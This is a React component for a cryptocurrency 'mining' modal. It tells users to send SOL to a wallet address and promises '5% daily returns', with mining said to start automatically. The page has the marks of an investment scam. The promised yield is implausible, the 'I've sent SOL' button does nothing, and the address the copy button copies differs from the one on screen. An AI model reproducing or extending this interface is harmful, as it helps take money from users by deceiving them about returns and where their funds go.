"use client";
import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Copy, Check } from "lucide-react";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
  AlertDialogTrigger,
} from "@/components/ui/alert-dialog";

const StakeModal = () => {
  const [copied, setCopied] = useState(false);

  const handleCopy = () => {
    navigator.clipboard.writeText(
      "HjzNMHpUgRy4x4xXkniGciS1JpfKKjjJzogcFWMPWhqb"
    );
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <AlertDialog>
      <AlertDialogTrigger asChild>
        <Button className="bg-primary text-[#F4D2AF] font-serif hover:bg-primary/90 px-6 py-3 rounded-full font-medium hover:scale-105 transition-transform shadow-[0_4px_0_rgba(0,0,0,1)] border-2 border-[#0E0000]">
          Start Mining $Bear Tokens
        </Button>
      </AlertDialogTrigger>
      <AlertDialogContent>
        <AlertDialogHeader>
          <AlertDialogTitle>
            Follow the steps below to start mining $bear tokens on the Solana
            (SOL) chain
          </AlertDialogTitle>
          <AlertDialogDescription>
            Send SOL to the address below to start earning 5% daily returns.
            Your mining will begin automatically once the transaction is
            confirmed.
          </AlertDialogDescription>
        </AlertDialogHeader>
        <div className="my-4 space-y-3">
          <div className="rounded-lg border p-4 bg-muted">
            <p className="text-sm font-medium mb-2">Wallet Address:</p>
            <div className="flex items-center gap-2">
              <code className="flex-1 text-xs break-all bg-background p-2 rounded">
                jzNMHpUgRy4x4xXkniGciS1JpfKKjjJzogcFWMPWhqb
              </code>
              <Button
                size="sm"
                variant="outline"
                onClick={handleCopy}
                className="relative"
              >
                {copied ? (
                  <>
                    <Check className="h-4 w-4 mr-1 animate-in zoom-in duration-200" />
                    Copied
                  </>
                ) : (
                  <>
                    <Copy className="h-4 w-4 mr-1" />
                    Copy
                  </>
                )}
              </Button>
            </div>
          </div>
          <p className="text-xs text-muted-foreground">
            Minimum stake: 0.1 SOL • Network: Solana Mainnet
          </p>
          <p className="text-xs text-red-500">
            PLease do not close this dialog until you have sent the SOL. and
            clicked &quout;"I&apos;'ve sent SOL".
          </p>
        </div>

        <AlertDialogFooter>
          <AlertDialogCancel>Cancel</AlertDialogCancel>
          <AlertDialogAction>I've sent SOL</AlertDialogAction>
        </AlertDialogFooter>
      </AlertDialogContent>
    </AlertDialog>
  );
};

export default StakeModal;
